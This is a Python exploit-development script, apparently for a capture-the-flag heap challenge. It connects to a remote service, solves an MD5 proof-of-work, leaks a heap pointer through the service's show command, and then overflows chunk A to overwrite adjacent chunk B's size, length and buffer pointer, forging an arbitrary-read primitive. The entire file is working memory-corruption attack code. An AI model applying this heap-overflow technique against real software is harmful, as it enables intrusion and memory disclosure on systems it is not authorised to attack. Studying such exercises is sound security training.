#!/usr/bin/env python3
"""Debug: isolate edit/show behaviour when corrupting B's struct."""
import hashlib, itertools, re, socket, string, sys, time, struct

HOST = sys.argv[1] if len(sys.argv) > 1 else "env.xj.edisec.net"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 30410
p64 = lambda x: struct.pack("<Q", x & 0xffffffffffffffff)
u64 = lambda b: struct.unpack("<Q", b.ljust(8, b"\x00"))[0]


def drain(s, wait=0.8, bufsize=65536):
    s.settimeout(0.2)
    buf = b""
    end = time.monotonic() + wait
    while time.monotonic() < end:
        try:
            d = s.recv(bufsize)
        except socket.timeout:
            continue
        if not d:
            break
        buf += d
    return buf


def solve_pow(md5hex, masked):
    pos = [i for i, ch in enumerate(masked) if ch == "_"]
    fixed = list(masked)
    for combo in itertools.product(string.ascii_uppercase, repeat=len(pos)):
        for i, ch in zip(pos, combo):
            fixed[i] = ch
        if hashlib.md5("".join(fixed).encode()).hexdigest() == md5hex:
            return "".join(combo)
    raise SystemExit("pow failed")


class C:
    def __init__(self, host, port):
        self.s = socket.create_connection((host, port), timeout=8)
        b = drain(self.s, 1.5)
        masked = re.search(rb"Token:\s*([A-Za-z_]+)", b).group(1).decode()
        md5hex = re.search(rb"MD5:\s*([0-9a-f]{32})", b).group(1).decode()
        ans = solve_pow(md5hex, masked)
        print("[pow] %s -> %s" % (masked, ans), flush=True)
        self.send(ans, 1.2)

    def send(self, line, wait=0.7, tag=""):
        line = str(line)
        try:
            self.s.sendall(line.encode() + b"\n")
        except OSError as e:
            print("[%s SEND-FAIL %r] %s" % (tag, e, line[:30]), flush=True)
            return b""
        r = drain(self.s, wait)
        print("[%s >>> %s] %r" % (tag, line[:24], r[:160]), flush=True)
        return r

    def create(self, idx, title, reserve, length, hexdata):
        self.send(1, 0.7, "c%d.menu" % idx); self.send(idx, 0.6, "c%d.idx" % idx)
        self.send(title, 0.6, "c%d.ttl" % idx); self.send(reserve, 0.6, "c%d.res" % idx)
        self.send(length, 0.6, "c%d.len" % idx); return self.send(hexdata, 0.9, "c%d.hex" % idx)

    def edit(self, idx, length, hexdata):
        self.send(2, 0.7, "e%s.menu" % idx); self.send(idx, 0.6, "e%s.idx" % idx)
        self.send(length, 0.6, "e%s.len" % idx); return self.send(hexdata, 0.9, "e%s.hex" % idx)

    def show(self, idx, wait=1.0):
        self.send(3, 0.7, "s%s.menu" % idx)
        return self.send(idx, wait, "s%s.idx" % idx)

    def pack(self, idx):
        self.send(4, 0.7, "p.menu"); return self.send(idx, 0.8, "p.idx")


def parse(r):
    m = re.search(rb"len=(\d+) cap=(\d+)\n([0-9a-f]*)\n", r)
    return (int(m.group(1)), int(m.group(2)), bytes.fromhex(m.group(3).decode())) if m else None


c = C(HOST, PORT)
c.create(0, "A", 512, 512, "41" * 512)
c.pack(0)
c.create(1, "B", 32, 32, "42" * 32)
c.create(2, "C", 32, 32, "43" * 32)
c.create(3, "D", 32, 32, "44" * 32)

d = parse(c.show(0))
ln, cap, blob = d
print("[struct] offsets:", {hex(o): hex(u64(blob[o:o + 8])) for o in
      (0x10, 0x18, 0x20, 0x28, 0x30, 0x38, 0x50, 0x58, 0x88, 0xc8, 0xf8, 0x138, 0x160, 0x168, 0x1a0)}, flush=True)
B_buf = u64(blob[0x30:0x38])
A_USER = B_buf - 0x60
print("[struct] B.buf=0x%x A_user=0x%x" % (B_buf, A_USER), flush=True)

# minimal edit length=0x38: only overwrite A[0..0x37] (A data + chunk2 prev/size + B cap/len/buf)
p = bytearray(b"\x00" * 0x38)
p[0x18:0x20] = p64(0x41)
p[0x20:0x28] = p64(0x40)
p[0x28:0x30] = p64(0x40)
p[0x30:0x38] = p64(A_USER)
c.edit(0, 0x38, p.hex())

d2 = parse(c.show(0))
print("[after edit] A struct now:", {hex(o): hex(u64(d2[2][o:o + 8])) for o in (0x20, 0x28, 0x30, 0x38, 0x58, 0x168)} if d2 else None, flush=True)
r = c.show(1)
d3 = parse(r)
print("[show B] ->", (d3[0], d3[1], d3[2][:64].hex()) if d3 else repr(r[:200]), flush=True)
print("[alive?] probe show 0:", repr(c.show(0)[:80]), flush=True)
c.s.close()